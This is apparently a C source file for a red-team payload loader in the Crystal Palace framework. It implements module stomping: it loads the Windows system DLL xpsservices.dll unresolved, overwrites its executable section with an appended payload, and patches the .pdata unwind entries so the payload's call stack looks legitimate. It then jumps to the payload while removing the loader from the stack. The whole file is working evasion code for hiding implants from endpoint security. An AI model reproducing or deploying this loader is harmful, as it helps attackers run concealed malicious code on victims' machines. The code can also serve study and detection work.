/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryExW (LPCWSTR lpLibFileName, HANDLE hFile, DWORD dwFlags);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualProtect (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char __BOFDATA__[0] __attribute__((section("my_data")));

char * findAppendedPICO() {
	return (char *)&__BOFDATA__;
}

/*
 * Walk a DLL looking for a section with specific characteristics
 */
#define FLAG(x, y) ( ((x) & (y)) == (y) )

char * findSection(DLLDATA * data, int flags, int minSize, DWORD * size) {
	DWORD                   numberOfSections;
	IMAGE_SECTION_HEADER  * sectionHdr       = NULL;

	/* loop through our sections */
	numberOfSections = data->NtHeaders->FileHeader.NumberOfSections;
	sectionHdr       = (IMAGE_SECTION_HEADER *)PTR_OFFSET(data->OptionalHeader, data->NtHeaders->FileHeader.SizeOfOptionalHeader);
	for (int x = 0; (x + 1) < numberOfSections; x++) {
		if (FLAG(sectionHdr->Characteristics, flags) && sectionHdr->SizeOfRawData >= minSize) {
			if (size != NULL)
				*size = sectionHdr->SizeOfRawData;

			return (char *)data->DosHeader + sectionHdr->VirtualAddress;
		}

		sectionHdr++;
	}

	return NULL;
}

/*
 * Get the PDATA section out of a DLL
 */
char * FindPDATA(DLLDATA* data, DWORD * size) {
	IMAGE_DATA_DIRECTORY exceptionDir = data->OptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];

	if (size != NULL)
		*size = exceptionDir.Size;

	return (char *)data->DosHeader + exceptionDir.VirtualAddress;
}

/*
 * Copy our RUNTIME_INFORMATION elsewhere, update its relative addresses factoring new location/new base address.
 */
#ifdef WIN_X64
void RelocateAndFix(_RESOURCE * src, char * dst, char * oldBase, char * newBase) {
	/* calculate the difference between our object code base address and the new base address */
	DWORD baseDiff  = (ULONG_PTR)oldBase - (ULONG_PTR)newBase;

	/* setup our src/dst pairs */
	PRUNTIME_FUNCTION rt_dst = (PRUNTIME_FUNCTION)dst;
	PRUNTIME_FUNCTION rt_src = (PRUNTIME_FUNCTION)src->value;

	DWORD count = src->length / sizeof(RUNTIME_FUNCTION);

	/* stomp over the existing .pdata. It's important our block of RUNTIME_FUNCTIONs are sorted inline with
	 * the others. Here, we're taking a chance that our RUNTIME_FUNCTION block ends in a way that's sorted
	 * compared to the other entries. */
	for (int x = 0; x < count; x++) {
		rt_dst->BeginAddress = rt_src->BeginAddress + baseDiff;
		rt_dst->EndAddress   = rt_src->EndAddress + baseDiff;
		rt_dst->UnwindData   = rt_src->UnwindData + baseDiff;
		rt_dst++;
		rt_src++;
	}
}
#endif

/*
 * Our PICO loader, have fun, go nuts!
 */
WINBASEAPI HANDLE WINAPI KERNEL32$CreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject (HANDLE hHandle, DWORD dwMilliseconds);

void go() {
	char *      src;
	DLLDATA     parser;
	IMPORTFUNCS funcs;

	DWORD       oldProt;
	DWORD       szText;

	/* find our DLL appended to this PIC */
	src = findAppendedPICO();

	/* load and parse our stomp DLL */
	HMODULE hModule = KERNEL32$LoadLibraryExW(L"c:\\windows\\system32\\xpsservices.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
	ParseDLL((char *)hModule, &parser);

	/* find our .text and .data sections (let's hope they're big enough) */
	char * code = findSection(&parser, IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE, PicoCodeSize(src), &szText);
	char * data = findSection(&parser, IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE,   PicoDataSize(src), NULL);

	if (code == NULL || data == NULL) {
		dprintf("Can't find appropriate section(s) for PICO data");
		return;
	}

	/* setup our IMPORTFUNCS data structure */
	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;

	/* let's make our .text section R/W so we can put our PICO over it */
	KERNEL32$VirtualProtect(code, szText, PAGE_READWRITE, &oldProt);

	/* load our pico into our destination address, thanks! */
	PicoLoad(&funcs, src, code, data);

	/* restore our .text section permissions */
	KERNEL32$VirtualProtect(code, szText, PAGE_EXECUTE_READ, &oldProt);

#ifdef WIN_X64
	/* let's find our .pdata section in the stomp DLL */
	DWORD  psize  = 0;
	char * pdata  = FindPDATA(&parser, &psize);

	/* grab our unwind data from the PICO headers and calculate its size when relocated */
	_RESOURCE * unwind = (_RESOURCE *)PicoGetUnwindData(src, code);

	/* check that we're all good */
	if (pdata != NULL && unwind != NULL && unwind->length <= psize) {
		/* change permissions and stomp our unwind data over the pdata we found */
		DWORD oldProt;
		KERNEL32$VirtualProtect(pdata, psize, PAGE_READWRITE, &oldProt);
		RelocateAndFix(unwind, pdata, code, (char *)hModule);
		KERNEL32$VirtualProtect(pdata, psize, PAGE_READONLY, &oldProt);
	}
#endif

	/* execute our PICO. We're using __transfer to tear down this stack frame and JMP
	   to the PicoEntryPoint... which keeps go() out of the call stack (x64). For x86,
	   we're just creating a new thread and waiting for it to complete. */
#ifdef WIN_X64
	__transfer((TRANSFERFUNC)PicoEntryPoint(src, code));
#else
	KERNEL32$WaitForSingleObject(KERNEL32$CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PicoEntryPoint(src, code), NULL, 0, NULL), -1);
#endif
}
